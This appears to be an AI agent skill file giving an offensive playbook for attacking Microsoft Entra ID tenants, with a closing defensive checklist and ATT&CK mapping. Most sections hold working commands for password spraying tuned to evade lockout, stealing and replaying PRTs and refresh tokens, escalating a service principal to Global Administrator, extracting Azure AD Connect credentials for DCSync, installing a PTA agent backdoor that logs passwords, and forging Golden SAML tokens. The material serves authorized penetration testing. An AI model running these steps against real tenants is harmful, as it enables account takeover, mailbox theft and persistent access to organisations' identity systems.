---
name: attacking-entra-id
description: Attack and enumerate Azure AD / Entra ID tenants — initial recon with AADInternals and ROADtools, password spraying, token theft (PRT, CAE, refresh tokens), application and service principal abuse, Conditional Access bypass, cross-tenant pivoting, hybrid identity attacks (PTA agent, Azure AD Connect), and managed identity abuse. Use when pentesting Entra ID tenants, assessing Azure AD security posture, or exploiting cloud identity misconfigurations.
---

# Attacking Entra ID

Entra ID (formerly Azure AD) is the identity control plane for Microsoft 365,
Azure, and thousands of SaaS integrations. Compromising it grants access to
everything those identities protect: mailboxes, SharePoint, Azure
subscriptions, and any application that trusts the tenant. Despite this, Entra
ID environments are routinely less monitored than on-premises Active Directory.
Most organizations lack equivalent detection coverage for cloud identity
attacks, and the attack surface -- OAuth tokens, application consent, service
principals, Conditional Access gaps -- is fundamentally different from
traditional AD.

Only against tenants you are authorized to test.

## When to Use

- Entra ID tenant reconnaissance and enumeration
- Password spraying against Microsoft 365 / Azure AD endpoints
- Stealing or replaying OAuth tokens, refresh tokens, and PRTs
- Abusing application registrations, service principals, and consent grants
- Bypassing Conditional Access policies
- Hybrid identity attacks (Azure AD Connect, PTA agents)

## When NOT to Use

- **On-premises Active Directory attacks** (Kerberoasting, DCSync, lateral
  movement) -- use `attacking-active-directory`
- **General AWS/Azure/GCP infrastructure** (VMs, storage, IAM roles) -- use
  `exploiting-cloud-platforms`
- **AD CS certificate abuse** -- use `abusing-adcs`
- **Detecting these attacks defensively** -- use `engineering-detections`

## Initial Reconnaissance

Tenant discovery requires no credentials. Start here to confirm the target
tenant exists, identify federation configuration, and map the attack surface.

```bash
# AADInternals -- tenant recon
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com

# Get tenant ID from OpenID configuration
curl https://login.microsoftonline.com/target.com/.well-known/openid-configuration

# Check user realm (managed vs. federated)
curl "https://login.microsoftonline.com/common/userrealm/user@target.com?api-version=2.0"

# ROADtools -- authenticated enumeration (once you have creds)
roadrecon auth -u user@target.com -p 'Password'
roadrecon gather
roadrecon gui
# Browse the GUI: users, groups, applications, service principals, conditional access

# AzureHound -- BloodHound collection for Azure/Entra
azurehound -u user@target.com -p 'Password' list --tenant target.com -o output.json
```

ROADtools GUI is the single most useful view of a tenant. Run `roadrecon
gather` immediately after obtaining any valid credential.

## Password Spraying

Microsoft rate-limits and logs sprays, so cadence matters. One password per
user per 30-60 minutes avoids smart lockout in most configurations.

```bash
# MSOLSpray -- targets the Microsoft Online login endpoint
Import-Module MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password 'Spring2026!' -URL https://login.microsoft.com

# o365spray -- enumerate then spray
o365spray --validate --domain target.com
o365spray --enum -U users.txt --domain target.com
o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com --rate 1 --safe 30

# TREVORspray -- distributed spraying via SOCKS proxies
trevorspray -u users.txt -p 'Summer2026!' --delay 1800
```

Lockout-safe cadence:
- One attempt per user per 30 minutes minimum
- Rotate passwords, not users
- Avoid the user's previous password (it triggers a different log event)
- Monitor for `AADSTS50053` (locked) and `AADSTS50126` (invalid password) to
  distinguish lockout from failure

## Token Theft and Replay

Entra ID authentication produces several token types. Each has different
lifetimes, scopes, and replay conditions.

### Primary Refresh Token (PRT)

The PRT is a long-lived credential cached on Azure AD joined or registered
devices. It grants SSO to all Microsoft cloud services.

```powershell
# Extract PRT using ROADtoken (requires SYSTEM or user session)
ROADtoken.exe

# RequestAADRefreshToken -- request a refresh token using the PRT
RequestAADRefreshToken.exe

# AADInternals -- export PRT from a joined device
$prt = Get-AADIntUserPRTToken
# Use it in a browser by injecting the x-ms-RefreshTokenCredential cookie
```

A stolen PRT bypasses MFA if MFA was satisfied when the PRT was issued, because
the PRT carries the MFA claim.

### Refresh Token Replay

```bash
# Exchange a refresh token for an access token
curl -X POST https://login.microsoftonline.com/TENANT_ID/oauth2/v2.0/token \
  -d "client_id=CLIENT_ID&grant_type=refresh_token&refresh_token=STOLEN_RT&scope=https://graph.microsoft.com/.default"

# ROADtools -- authenticate with a refresh token
roadrecon auth --refresh-token 'eyJ0...'
roadrecon gather
```

### Continuous Access Evaluation (CAE) Gaps

CAE-aware tokens are checked against revocation in near real-time, but not all
applications support CAE. Token lifetime for non-CAE resources remains up to 1
hour. Critical event evaluation (user disabled, password change) propagates
within minutes, but IP-based evaluation covers only supported workloads. Check
whether the target application enforces CAE before assuming token revocation is
instantaneous.

## Application and Service Principal Abuse

Applications and service principals are the most under-reviewed attack surface
in Entra ID. They persist through user offboarding, hold credentials that
nobody rotates, and often have excessive API permissions.

### Dangerous Application Permissions

Application (not delegated) permissions that grant tenant-wide access without
user consent:

- `Mail.Read` / `Mail.ReadWrite` -- read all mailboxes in the tenant
- `RoleManagement.ReadWrite.Directory` -- assign any directory role, including
  Global Administrator
- `AppRoleAssignment.ReadWrite.All` -- grant any app role to any principal
- `Application.ReadWrite.All` -- modify any application registration
- `Directory.ReadWrite.All` -- broad write across directory objects

```bash
# Enumerate applications with high-privilege permissions (Graph API)
az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles" \
  --query "value[].{name:displayName,appId:appId}"

# ROADtools -- the GUI shows app permissions under each service principal

# Find apps with credentials (secrets/certificates)
az ad app list --query "[?passwordCredentials || keyCredentials].{name:displayName,appId:appId}" -o table
```

### Consent Grant Abuse (Illicit Consent Grant)

If users can consent to applications, an attacker can register a malicious
multi-tenant app requesting Mail.Read and similar scopes, then phish a user
into granting consent.

```powershell
# Microsoft Graph PowerShell. The AzureAD and MSOnline modules are gone --
# deprecated March 2024, unsupported after 30 March 2025, retired from
# July 2025 -- so any Get-AzureAD*/Get-Msol* command you find in older
# tradecraft will simply fail to authenticate.
Connect-MgGraph -Scopes 'Policy.Read.All','Application.Read.All'

# Check whether user consent is allowed
(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions.PermissionGrantPoliciesAssigned
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present,
# users can consent to third-party apps

# Enumerate existing consent grants
Get-MgOauth2PermissionGrant -All
```

### App Role Assignment Escalation

If you control a service principal with `AppRoleAssignment.ReadWrite.All`:

```bash
# Grant RoleManagement.ReadWrite.Directory to your controlled SP
az rest --method POST \
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/SP_OBJECT_ID/appRoleAssignments" \
  --body '{"principalId":"SP_OBJECT_ID","resourceId":"GRAPH_SP_ID","appRoleId":"ROLE_MANAGEMENT_ROLE_ID"}'
# Then assign Global Administrator to any user or SP
```

## Conditional Access Bypass

Conditional Access (CA) policies are the primary security control in Entra ID,
but gaps are common.

**Common bypass patterns:**

- **Legacy authentication protocols** -- CA policies that do not block legacy
  auth allow password-only authentication via IMAP/POP/SMTP
- **Device compliance gaps** -- policies requiring compliant devices often
  exclude service accounts or break-glass accounts
- **Named location trust** -- if the policy trusts certain IP ranges, an
  attacker on those networks (VPN, compromised on-prem host) bypasses MFA
- **Platform exclusions** -- policies scoped to Windows/macOS may not apply to
  Linux or mobile
- **Application exclusions** -- not all applications are covered; check
  Microsoft Admin portals, Azure Management, and Graph API specifically
- **CAE vs. non-CAE resources** -- revocation signals do not reach non-CAE
  applications in real time

```bash
# Enumerate CA policies (requires Policy.Read.All or equivalent)
az rest --method GET --url "https://graph.microsoft.com/v1.0/identity/conditionalAccessPolicies"

# ROADtools -- CA policies are visible in the GUI after gathering

# Test legacy auth (if not blocked)
curl -u user@target.com:password https://outlook.office365.com/EWS/Exchange.asmx
```

## Cross-Tenant Attacks

### B2B Guest Pivoting

Guest accounts in one tenant often have access to resources in the inviting
tenant. If you compromise a user who is a guest in another tenant, enumerate
what that guest can reach.

```bash
# List tenants the compromised user is a guest in
az account list --all --query "[].{tenant:tenantId,name:name}"

# Switch context to the target tenant
az login --tenant TARGET_TENANT_ID

# Enumerate accessible resources in the target tenant
az ad signed-in-user show
az group list
```

### Tenant-to-Tenant Trust Abuse

Cross-tenant access settings and cross-tenant synchronization can create trust
paths:

- Inbound trust allowing MFA claims from the source tenant -- compromising a
  user in the source tenant gives MFA-bypassed access to the target
- Cross-tenant sync pushing identities into the target -- if you control the
  source tenant's sync, you can inject accounts into the target

```powershell
# Enumerate cross-tenant access policies
Get-MgPolicyCrossTenantAccessPolicyPartner | Select TenantId, InboundTrust, AutomaticUserConsentSettings
```

## Hybrid Identity Attacks

Hybrid environments connect on-premises AD to Entra ID, creating attack paths
in both directions.

### Azure AD Connect -- Sync Account DCSync

Azure AD Connect uses a service account with Directory Replication permissions
(DCSync rights) in on-premises AD. The credentials are stored encrypted on the
Connect server.

```powershell
# AADInternals -- extract the sync account credentials from the Connect server
# Requires local admin on the Azure AD Connect host
Import-Module AADInternals
Get-AADIntSyncCredentials
# Returns: username (MSOL_xxxx or custom), password, tenant ID

# Use the sync account to DCSync on-prem AD
secretsdump.py 'MSOL_abc123:password@dc.domain.local' -just-dc
```

Compromising the Azure AD Connect server is a domain compromise. The sync
account also has the ability to reset cloud passwords unless password writeback
scope is restricted.

### Pass-Through Authentication (PTA) Agent Abuse

PTA agents validate on-prem passwords for cloud logins. An attacker with admin
access on the PTA agent host can intercept credentials in cleartext.

```powershell
# AADInternals -- install a PTA agent backdoor that logs credentials
# and optionally accepts any password
Install-AADIntPTASpy

# Retrieve intercepted credentials
Get-AADIntPTASpyLog

# Remove the spy
Remove-AADIntPTASpy
```

Compromising any PTA agent host gives cleartext credentials for every cloud
authentication by non-synced-hash users.

### Federation Abuse (Golden SAML)

If ADFS is in use and you have the token-signing certificate:

```bash
# Export the ADFS token-signing certificate (requires DA or local admin on ADFS)
# Then forge SAML tokens for any federated user
# AADInternals:
$cert = Export-AADIntADFSSigningCertificate
Open-AADIntOffice365Portal -ImmutableID USER_IMMUTABLE_ID -Issuer FEDERATION_ISSUER -PfxFileName cert.pfx
```

## Managed Identity and Workload Identity Federation

### Managed Identity Abuse

Azure managed identities (system-assigned and user-assigned) are service
principals that Azure resources use to authenticate to other services.

```bash
# From a compromised Azure VM/Function/App Service -- request a token
curl -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"

# Use the token against Graph API
curl -H "Authorization: Bearer ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me
```

If the managed identity has high-privilege Graph or ARM permissions, this is
equivalent to a service principal compromise.

### Workload Identity Federation

Workload identity federation allows external identity providers (GitHub
Actions, GCP, AWS) to authenticate as an Entra ID service principal without
secrets.

Misconfiguration risk: overly broad subject/issuer conditions. If a federated
credential trusts `repo:org/*` instead of `repo:org/specific-repo:ref:refs/heads/main`,
any repo in the org can assume the identity.

```bash
# Enumerate federated credentials on an application
az ad app federated-credential list --id APP_OBJECT_ID
```

## Defensive Review Checklist

When performing a security assessment rather than an attack:

- Are legacy authentication protocols blocked in all CA policies?
- Which applications have application-level (not delegated) permissions to
  Graph API, and when were their credentials last rotated?
- Can users consent to third-party applications, or is admin consent required?
- Are all CA policies applied to all cloud apps, or do exclusions exist?
- Is PRT protection (token binding to TPM) enforced on joined devices?
- Are break-glass accounts scoped and monitored?
- Is the Azure AD Connect server hardened and monitored as a Tier 0 asset?
- Are PTA agent hosts hardened equivalently to domain controllers?
- Are cross-tenant access policies scoped to specific partners, or wide open?
- Are workload identity federation subject conditions narrowly scoped?
- Is sign-in and audit log retention configured beyond the 7-day default?

## Rationalizations to Reject

- *"We have Conditional Access, so MFA is everywhere."* Check for legacy auth
  exclusions, platform gaps, and application exclusions. CA only works when it
  covers every path.
- *"The app only has delegated permissions, not application permissions."*
  Delegated permissions exercised by an admin-consented app with a valid token
  still operate at the user's full privilege level.
- *"We rotate user passwords regularly."* Stolen PRTs and refresh tokens survive
  password rotation unless the sessions are explicitly revoked.
- *"The service principal has no interactive login."* It does not need one. A
  leaked client secret with `Mail.Read` application permission reads every
  mailbox in the tenant silently.
- *"Our Azure AD Connect server is on the domain, so it's already secured."*
  It holds DCSync-capable credentials and should be treated as Tier 0 --
  equivalent to a domain controller.
- *"We only allow B2B guests from trusted partners."* If the partner tenant is
  compromised, inbound trust policies may let the attacker inherit MFA claims
  and access your resources without re-authenticating.
- *"Managed identities are more secure because there are no secrets to leak."*
  True for credential theft, but any code running on the resource can request
  tokens. Overly permissioned managed identities are still a privilege
  escalation path.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills-core/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Initial Access** (TA0001)

- [T1078.004](https://attack.mitre.org/techniques/T1078/004/) Cloud Accounts _(also Persistence)_ — see also `exploiting-cloud-platforms`
- [T1199](https://attack.mitre.org/techniques/T1199/) Trusted Relationship — see also `exploiting-cloud-platforms`, `abusing-ci-cd-oidc`

**Credential Access** (TA0006)

- [T1528](https://attack.mitre.org/techniques/T1528/) Steal Application Access Token — see also `testing-apis`, `exploiting-cloud-platforms`, `attacking-oauth-oidc`
- [T1606.002](https://attack.mitre.org/techniques/T1606/002/) SAML Tokens — see also `attacking-saml`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `attacking-active-directory` -- on-premises AD attacks and lateral movement
- `exploiting-cloud-platforms` -- broader cloud platform exploitation (AWS, Azure, GCP)
- `abusing-adcs` -- AD CS certificate abuse, including hybrid PKI scenarios
- `engineering-detections` -- detection engineering for Entra ID sign-in and audit logs
